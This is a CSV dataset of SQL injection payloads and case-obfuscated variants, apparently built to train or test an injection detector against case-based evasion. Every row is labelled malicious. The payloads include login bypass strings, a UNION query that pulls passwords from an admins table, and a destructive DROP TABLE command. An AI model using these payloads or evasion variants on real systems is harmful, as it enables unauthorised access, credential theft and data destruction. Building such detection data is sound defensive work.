variant_id,original_payload,variant_payload,variation_type,Label
CASE_00000,' OR 1=1--,' Or 1=1--,alternating_case,1
CASE_00001,' OR 1=1--,' Or 1=1--,alternating_case,1
CASE_00002,' OR 1=1--,' Or 1=1--,random_case,1
CASE_00003,' OR 1=1--,' or 1=1--,random_case,1
CASE_00004,' OR 1=1--,' or 1=1--,random_case,1
CASE_00005,' OR 1=1--,'Or1=1--,camel_case,1
CASE_00006,' OR 1=1--,' OR 1=1--,mixed_case,1
CASE_00007,' UNION SELECT NULL--,' UnIoN sElEcT nUlL--,alternating_case,1
CASE_00008,' UNION SELECT NULL--,' UnIoN sElEcT nUlL--,alternating_case,1
CASE_00009,' UNION SELECT NULL--,' uniON SelEcT NuLL--,random_case,1
CASE_00010,' UNION SELECT NULL--,' uNioN SeLeCt nUll--,random_case,1
CASE_00011,' UNION SELECT NULL--,' UNiON SELEct nuLl--,random_case,1
CASE_00012,' UNION SELECT NULL--,'UnionSelectNull--,camel_case,1
CASE_00013,' UNION SELECT NULL--,' UNiON SElECt NuLL--,mixed_case,1
CASE_00014,admin'--,AdMiN'--,alternating_case,1
CASE_00015,admin'--,AdMiN'--,alternating_case,1
CASE_00016,admin'--,aDMin'--,random_case,1
CASE_00017,admin'--,admIN'--,random_case,1
CASE_00018,admin'--,ADmIn'--,random_case,1
CASE_00019,admin'--,Admin'--,camel_case,1
CASE_00020,admin'--,AdMIn'--,mixed_case,1
CASE_00021,SELECT * FROM users,SeLeCt * FrOm UsErS,alternating_case,1
CASE_00022,SELECT * FROM users,SeLeCt * FrOm UsErS,alternating_case,1
CASE_00023,SELECT * FROM users,SelECT * fROm UserS,random_case,1
CASE_00024,SELECT * FROM users,seLEcT * fROm uSERS,random_case,1
CASE_00025,SELECT * FROM users,SEleCT * frOM useRs,random_case,1
CASE_00026,SELECT * FROM users,Select*FromUsers,camel_case,1
CASE_00027,SELECT * FROM users,SeLEcT * FrOM USeRS,mixed_case,1
CASE_00028,'; DROP TABLE users--,'; DrOp TaBlE uSeRs--,alternating_case,1
CASE_00029,'; DROP TABLE users--,'; DrOp TaBlE uSeRs--,alternating_case,1
CASE_00030,'; DROP TABLE users--,'; drOP tABlE usERs--,random_case,1
CASE_00031,'; DROP TABLE users--,'; DRop taBLe usErs--,random_case,1
CASE_00032,'; DROP TABLE users--,'; drop table UsErS--,random_case,1
CASE_00033,'; DROP TABLE users--,';DropTableUsers--,camel_case,1
CASE_00034,'; DROP TABLE users--,'; DrOP TAbLE USeRS--,mixed_case,1
CASE_00035,UNION SELECT password FROM admins,UnIoN sElEcT pAsSwOrD fRoM aDmInS,alternating_case,1
CASE_00036,UNION SELECT password FROM admins,UnIoN sElEcT pAsSwOrD fRoM aDmInS,alternating_case,1
